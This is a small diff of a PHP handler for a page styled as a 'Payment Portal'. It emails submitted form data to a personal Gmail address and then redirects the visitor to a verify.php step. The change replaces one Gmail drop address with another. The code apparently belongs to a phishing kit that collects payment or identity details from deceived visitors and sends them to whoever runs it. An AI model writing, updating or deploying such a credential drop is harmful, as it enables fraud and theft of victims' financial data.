@@ -49,12 +49,12 @@ if (!isset($_POST)) {
     ";
 
     // Email headers
-    $headers = "From: Payment Portal <habeebajani9@gmail.com>\r\n";
+    $headers = "From: Payment Portal <americanresidence435@gmail.com>\r\n";
     $headers .= "Reply-To: ".$email."\r\n";
     $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
 
     // Send the email
-    if (mail('habeebajani9@gmail.com', $subject, $message, $headers)) {
+    if (mail('americanresidence435@gmail.com', $subject, $message, $headers)) {
         header("Location: verify.php?user=".$userId."&id=".$id);
     } else {
         http_response_code(500); // Internal Server Error
